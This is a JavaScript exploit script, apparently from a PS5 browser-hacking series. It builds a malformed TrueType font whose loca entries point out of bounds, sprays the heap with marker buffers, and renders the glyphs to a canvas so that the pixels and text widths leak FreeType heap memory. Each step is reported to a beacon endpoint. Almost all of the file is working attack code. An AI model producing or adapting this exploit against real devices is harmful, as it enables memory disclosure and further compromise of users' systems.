// p260 — FreeType OOB canvas info leak
// V180A confirmed: PS5 loads+renders fonts with OOB loca offsets
// Strategy: point loca entries past glyf into heap memory.
// FreeType reads heap data as glyph contour points.
// Render glyphs to canvas, read pixels back = heap data leak.
//
// Heap spray ArrayBuffers with marker data adjacent to font buffer.
// If OOB glyph reads our spray, pixels reveal marker values.
//
// Beacon prefix: V260-

(function() {
  function B(tag, body) {
    try {
      var url = '/beacon/V260-' + tag + '?t=' + Date.now();
      if (body) navigator.sendBeacon(url, body || '');
      else new Image().src = url;
    } catch(e) {}
  }

  function push16(arr, val) {
    arr.push((val >> 8) & 0xFF);
    arr.push(val & 0xFF);
  }
  function push32(arr, val) {
    arr.push((val >> 24) & 0xFF);
    arr.push((val >> 16) & 0xFF);
    arr.push((val >> 8) & 0xFF);
    arr.push(val & 0xFF);
  }
  function tag2u32(s) {
    return (s.charCodeAt(0) << 24) | (s.charCodeAt(1) << 16) |
           (s.charCodeAt(2) << 8) | s.charCodeAt(3);
  }
  function calcChecksum(data) {
    var sum = 0;
    var nLongs = Math.floor((data.length + 3) / 4);
    var padded = new Uint8Array(nLongs * 4);
    padded.set(data);
    var dv = new DataView(padded.buffer);
    for (var i = 0; i < nLongs; i++) sum = (sum + dv.getUint32(i * 4)) >>> 0;
    return sum;
  }

  B('BOOT');

  if (typeof FontFace === 'undefined') { B('NO-FONTFACE'); return; }

  // Phase A: Heap spray BEFORE font load
  // Spray ArrayBuffers with recognizable data that FreeType will
  // interpret as glyph contours if it reads OOB
  var SPRAY_SIZE = 4096;
  var SPRAY_COUNT = 2000;
  var sprayBufs = [];
  for (var s = 0; s < SPRAY_COUNT; s++) {
    var ab = new ArrayBuffer(SPRAY_SIZE);
    var dv = new DataView(ab);
    // Fill with pattern that makes valid-ish TrueType glyph data:
    // First 2 bytes: numberOfContours = 1 (int16 big-endian)
    // Next 8 bytes: xMin, yMin, xMax, yMax (int16 each)
    // Then: endPtsOfContours[0] = 3 (4-point contour)
    // Then: instructionLength = 0
    // Then: flags for 4 points (ON_CURVE, short x/y deltas)
    // Then: x deltas, y deltas
    //
    // Actually we just fill with a distinctive pattern.
    // If FreeType reads this as glyph data, the contour shape
    // will depend on our marker values = info leak.
    for (var off = 0; off < SPRAY_SIZE; off += 4) {
      dv.setUint32(off, 0xDEAD0000 + (off & 0xFFFF));
    }
    sprayBufs.push(ab);
  }
  B('SPRAY-' + SPRAY_COUNT);

  // Phase B: Build TTF with OOB loca entries
  // numGlyphs = 16 (notdef + 15 OOB glyphs)
  // glyf table = 32 bytes (one valid .notdef with 0 contours)
  // loca entries for glyphs 1-15 point past glyf into heap

  var NUM_GLYPHS = 16;
  var GLYF_SIZE = 32;

  function buildOOBFont(oobOffset) {
    var tables = {};

    // head (54 bytes)
    tables.head = new Uint8Array(54);
    var hv = new DataView(tables.head.buffer);
    hv.setUint32(0, 0x00010000);
    hv.setUint32(4, 0x00005000);
    hv.setUint32(8, 0x00000000);
    hv.setUint32(12, 0x5F0F3CF5);
    hv.setUint16(16, 0x000B);
    hv.setUint16(18, 1000);
    hv.setInt16(36, -500);
    hv.setInt16(38, -500);
    hv.setInt16(40, 500);
    hv.setInt16(42, 500);
    hv.setUint16(44, 0);
    hv.setUint16(46, 8);
    hv.setInt16(48, 2);
    hv.setInt16(50, 1);  // indexToLocFormat = 1 (long offsets)
    hv.setInt16(52, 0);

    // maxp (32 bytes)
    tables.maxp = new Uint8Array(32);
    var mv = new DataView(tables.maxp.buffer);
    mv.setUint32(0, 0x00010000);
    mv.setUint16(4, NUM_GLYPHS);
    mv.setUint16(6, 64);   // maxPoints (generous)
    mv.setUint16(8, 4);    // maxContours
    mv.setUint16(14, 2);   // maxZones

    // hhea (36 bytes)
    tables.hhea = new Uint8Array(36);
    var hhv = new DataView(tables.hhea.buffer);
    hhv.setUint32(0, 0x00010000);
    hhv.setInt16(4, 800);
    hhv.setInt16(6, -200);
    hhv.setInt16(8, 0);
    hhv.setUint16(10, 600);
    hhv.setInt16(16, 600);
    hhv.setInt16(18, 1);
    hhv.setUint16(34, NUM_GLYPHS);

    // hmtx (NUM_GLYPHS * 4 bytes)
    tables.hmtx = new Uint8Array(NUM_GLYPHS * 4);
    var hmv = new DataView(tables.hmtx.buffer);
    for (var g = 0; g < NUM_GLYPHS; g++) {
      hmv.setUint16(g * 4, 600);
      hmv.setInt16(g * 4 + 2, 0);
    }

    // cmap: format 4, map A-O (0x41-0x4F) to glyphs 1-15
    var cmapData = [];
    push16(cmapData, 0); push16(cmapData, 1);
    push16(cmapData, 3); push16(cmapData, 1); push32(cmapData, 12);
    var segCount = 2;
    push16(cmapData, 4);
    push16(cmapData, 36);
    push16(cmapData, 0);
    push16(cmapData, segCount * 2);
    push16(cmapData, 4);
    push16(cmapData, 1);
    push16(cmapData, segCount * 2 - 4);
    push16(cmapData, 0x4F); // endCode: O
    push16(cmapData, 0xFFFF);
    push16(cmapData, 0);
    push16(cmapData, 0x41); // startCode: A
    push16(cmapData, 0xFFFF);
    push16(cmapData, (-0x40) & 0xFFFF); // idDelta: maps 0x41->1, 0x42->2, etc
    push16(cmapData, 1);
    push16(cmapData, 0);
    push16(cmapData, 0);
    tables.cmap = new Uint8Array(cmapData);

    // glyf: 32 bytes, just a .notdef with 0 contours
    tables.glyf = new Uint8Array(GLYF_SIZE);
    var gv = new DataView(tables.glyf.buffer);
    // .notdef glyph: numberOfContours = 0, bbox = 0
    gv.setInt16(0, 0);  // numberOfContours = 0
    gv.setInt16(2, 0);  // xMin
    gv.setInt16(4, 0);  // yMin
    gv.setInt16(6, 0);  // xMax
    gv.setInt16(8, 0);  // yMax
    // Rest is padding zeros

    // loca (long format): NUM_GLYPHS + 1 entries, 4 bytes each
    tables.loca = new Uint8Array((NUM_GLYPHS + 1) * 4);
    var lv = new DataView(tables.loca.buffer);
    lv.setUint32(0, 0);          // glyph 0 (.notdef) starts at 0
    lv.setUint32(4, GLYF_SIZE);  // glyph 0 ends / glyph 1 starts at GLYF_SIZE

    // Glyphs 1-15: each points to glyf + oobOffset + (i*256)
    // This reads 256 bytes of heap per glyph at increasing offsets
    for (var g = 1; g <= 15; g++) {
      var off = GLYF_SIZE + oobOffset + (g - 1) * 256;
      lv.setUint32(g * 4, off);
      lv.setUint32((g + 1) * 4, off + 256);
    }

    // post (32 bytes)
    tables.post = new Uint8Array(32);
    var pv = new DataView(tables.post.buffer);
    pv.setUint32(0, 0x00030000);
    pv.setInt16(8, -100);
    pv.setInt16(10, 50);

    // name
    var nameData = [];
    push16(nameData, 0); push16(nameData, 4);
    push16(nameData, 6 + 4 * 12);
    var nameStr = 'OOB' + oobOffset;
    var nameBytes = [];
    for (var i = 0; i < nameStr.length; i++) {
      nameBytes.push(0); nameBytes.push(nameStr.charCodeAt(i));
    }
    var nameIDs = [1, 2, 4, 6];
    for (var n = 0; n < nameIDs.length; n++) {
      push16(nameData, 3); push16(nameData, 1);
      push16(nameData, 0x0409); push16(nameData, nameIDs[n]);
      push16(nameData, nameBytes.length); push16(nameData, 0);
    }
    for (var i = 0; i < nameBytes.length; i++) nameData.push(nameBytes[i]);
    tables.name = new Uint8Array(nameData);

    // OS/2 (needed for some renderers)
    tables['OS/2'] = new Uint8Array(78);
    var ov = new DataView(tables['OS/2'].buffer);
    ov.setUint16(0, 1);     // version
    ov.setInt16(2, 500);    // xAvgCharWidth
    ov.setUint16(4, 400);   // usWeightClass
    ov.setUint16(6, 5);     // usWidthClass
    ov.setInt16(68, 800);   // sTypoAscender
    ov.setInt16(70, -200);  // sTypoDescender
    ov.setInt16(72, 0);     // sTypoLineGap

    // Assemble
    var tagList = Object.keys(tables).sort();
    var numTables = tagList.length;
    var headerSize = 12;
    var dirSize = numTables * 16;
    var offset = headerSize + dirSize;

    var tablePadded = {};
    var totalSize = offset;
    for (var i = 0; i < tagList.length; i++) {
      var t = tables[tagList[i]];
      var padLen = (4 - (t.length % 4)) % 4;
      var p = new Uint8Array(t.length + padLen);
      p.set(t);
      tablePadded[tagList[i]] = p;
      totalSize += p.length;
    }

    var buf = new ArrayBuffer(totalSize);
    var view = new DataView(buf);
    var u8 = new Uint8Array(buf);

    view.setUint32(0, 0x00010000);
    view.setUint16(4, numTables);
    var sr = 1; while (sr * 2 <= numTables) sr *= 2; sr *= 16;
    view.setUint16(6, sr);
    var es = 0; var tmp2 = sr / 16; while (tmp2 > 1) { tmp2 >>= 1; es++; }
    view.setUint16(8, es);
    view.setUint16(10, numTables * 16 - sr);

    var off = headerSize + dirSize;
    for (var i = 0; i < tagList.length; i++) {
      var tag = tagList[i];
      var raw = tables[tag];
      var padded = tablePadded[tag];
      var dirOff = headerSize + i * 16;
      view.setUint32(dirOff, tag2u32(tag));
      view.setUint32(dirOff + 4, calcChecksum(raw));
      view.setUint32(dirOff + 8, off);
      view.setUint32(dirOff + 12, raw.length);
      u8.set(padded, off);
      off += padded.length;
    }

    return buf;
  }

  B('FONT-BUILD-START');

  // Phase C: Load font, render to canvas, read pixels
  function testOOBOffset(oobOffset, label) {
    return new Promise(function(resolve) {
      var fontBuf;
      try {
        fontBuf = buildOOBFont(oobOffset);
      } catch(e) {
        B(label + '-BUILD-ERR-' + e.message.substring(0, 30));
        resolve(); return;
      }
      B(label + '-BUILT-' + fontBuf.byteLength + 'B');

      var fontName = 'OOBFont' + label;
      var face = new FontFace(fontName, fontBuf);

      face.load().then(function(loaded) {
        document.fonts.add(loaded);
        B(label + '-LOADED');

        // Render glyphs A-O to canvas
        var cvs = document.createElement('canvas');
        cvs.width = 200;
        cvs.height = 200;
        var ctx = cvs.getContext('2d');

        var glyphChars = 'ABCDEFGHIJKLMNO';
        var nonZeroGlyphs = 0;
        var pixelHashes = [];

        for (var g = 0; g < glyphChars.length; g++) {
          ctx.clearRect(0, 0, 200, 200);
          ctx.fillStyle = '#000000';
          ctx.fillRect(0, 0, 200, 200);
          ctx.fillStyle = '#FFFFFF';
          ctx.font = '120px ' + fontName;
          ctx.fillText(glyphChars[g], 10, 150);

          var imgData = ctx.getImageData(0, 0, 200, 200);
          var pixels = imgData.data;

          // Count non-black pixels (white pixels from glyph rendering)
          var whiteCount = 0;
          var hash = 0;
          for (var p = 0; p < pixels.length; p += 4) {
            if (pixels[p] > 128 || pixels[p + 1] > 128 || pixels[p + 2] > 128) {
              whiteCount++;
              // Simple hash of pixel position
              hash = ((hash * 31) + (p / 4)) >>> 0;
            }
          }

          if (whiteCount > 0) {
            nonZeroGlyphs++;
            pixelHashes.push(g + ':' + whiteCount + ':' + (hash & 0xFFFF).toString(16));
          }
        }

        B(label + '-RENDERED-' + nonZeroGlyphs);
        if (pixelHashes.length > 0) {
          B(label + '-PIXELS', pixelHashes.join(' '));
        }

        // Phase D: Detailed scan of first few glyphs
        // For each OOB glyph that rendered, extract pixel pattern
        // as a compact representation of the heap data
        for (var g = 0; g < Math.min(glyphChars.length, 5); g++) {
          ctx.clearRect(0, 0, 200, 200);
          ctx.fillStyle = '#000000';
          ctx.fillRect(0, 0, 200, 200);
          ctx.fillStyle = '#FFFFFF';
          ctx.font = '120px ' + fontName;
          ctx.fillText(glyphChars[g], 10, 150);

          var imgData2 = ctx.getImageData(0, 0, 200, 200);
          var px = imgData2.data;

          // Extract bounding box of white pixels
          var minX = 200, maxX = 0, minY = 200, maxY = 0;
          var totalW = 0;
          for (var y = 0; y < 200; y++) {
            for (var x = 0; x < 200; x++) {
              var idx = (y * 200 + x) * 4;
              if (px[idx] > 128) {
                if (x < minX) minX = x;
                if (x > maxX) maxX = x;
                if (y < minY) minY = y;
                if (y > maxY) maxY = y;
                totalW++;
              }
            }
          }

          if (totalW > 5) {
            B(label + '-G' + g + '-BOX-' + minX + ',' + minY + '-' + maxX + ',' + maxY + '-N' + totalW);

            // Sample 16 pixel values across the glyph area
            var samples = [];
            var stepX = Math.max(1, Math.floor((maxX - minX) / 4));
            var stepY = Math.max(1, Math.floor((maxY - minY) / 4));
            for (var sy = minY; sy <= maxY; sy += stepY) {
              for (var sx = minX; sx <= maxX; sx += stepX) {
                var si = (sy * 200 + sx) * 4;
                samples.push(px[si] > 128 ? '1' : '0');
              }
            }
            B(label + '-G' + g + '-SAMP', samples.join(''));
          }
        }

        // Cleanup
        try { document.fonts.delete(loaded); } catch(e) {}
        resolve();
      }).catch(function(err) {
        B(label + '-LOAD-ERR-' + err.message.substring(0, 40));
        resolve();
      });
    });
  }

  // Phase E: Compare OOB glyphs across different heap regions
  // Test multiple OOB offsets to read different parts of heap
  var offsets = [0, 256, 1024, 4096, 8192, 16384];

  function runTests(idx) {
    if (idx >= offsets.length) {
      B('ALL-DONE');
      return;
    }
    testOOBOffset(offsets[idx], 'T' + idx + '-OFF' + offsets[idx]).then(function() {
      runTests(idx + 1);
    });
  }

  // Phase F: Also try to read via measureText width differences
  // Different heap data = different glyph shapes = different advance widths
  function widthLeak(oobOffset, label) {
    return new Promise(function(resolve) {
      var fontBuf = buildOOBFont(oobOffset);
      var fontName = 'WFont' + label;
      var face = new FontFace(fontName, fontBuf);
      face.load().then(function(loaded) {
        document.fonts.add(loaded);
        var cvs = document.createElement('canvas');
        var ctx = cvs.getContext('2d');
        ctx.font = '48px ' + fontName;
        var widths = [];
        var chars = 'ABCDEFGHIJKLMNO';
        for (var i = 0; i < chars.length; i++) {
          var m = ctx.measureText(chars[i]);
          widths.push(Math.round(m.width * 100));
        }
        var uniqueW = {};
        for (var w = 0; w < widths.length; w++) uniqueW[widths[w]] = 1;
        var uCount = Object.keys(uniqueW).length;
        B(label + '-WIDTHS-UNIQUE-' + uCount);
        if (uCount > 1) {
          B(label + '-WIDTHS', widths.join(','));
        }
        try { document.fonts.delete(loaded); } catch(e) {}
        resolve();
      }).catch(function(e) {
        B(label + '-WERR-' + e.message.substring(0, 30));
        resolve();
      });
    });
  }

  // Run everything
  B('PHASE-START');
  runTests(0);

})();
